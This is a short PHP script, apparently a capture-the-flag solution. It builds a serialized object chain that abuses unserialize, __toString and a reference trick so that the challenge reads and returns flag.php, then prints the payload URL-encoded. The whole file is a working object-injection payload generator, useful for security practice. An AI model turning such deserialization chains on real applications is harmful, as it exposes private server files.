<?php
@error_reporting(1);
include 'flag.php';
class baby
{
    protected $skyobj;
    public $aaa;
    public $bbb;
    function __construct($s)
    {
        if($s){
            $this->bbb=&$this->aaa;
            $this->skyobj=new sec();
        } else{
            $c=new cool();
            $c->filename="flag.php";
            $b=new baby('i');
            $c->amzing=serialize($b);
            $this->skyobj = $c;
        }
    }
    function __toString()
    {
        if (isset($this->skyobj))
            return $this->skyobj->read();
    }
}

class cool
{
    public $filename;
    public $nice; //baby object
    public $amzing;  //baby object serialized
    function read()
    {
        $this->nice = unserialize($this->amzing);
        $this->nice->aaa = $sth;
        if($this->nice->aaa === $this->nice->bbb)
        {
            $file = "./{$this->filename}";
            if (file_get_contents($file))
            {
                return file_get_contents($file);
            }
            else
            {
                return "you must be joking!";
            }
        }
    }
}

class sec
{
    function read()
    {
        return "it's so sec~~";
    }
}

// echo $bb_ser;
$b=new baby();
$b_ser=serialize($b);
echo urlencode($b_ser);
echo "\n";
$Input_data = unserialize($b_ser); //baby object
echo $Input_data;
?>
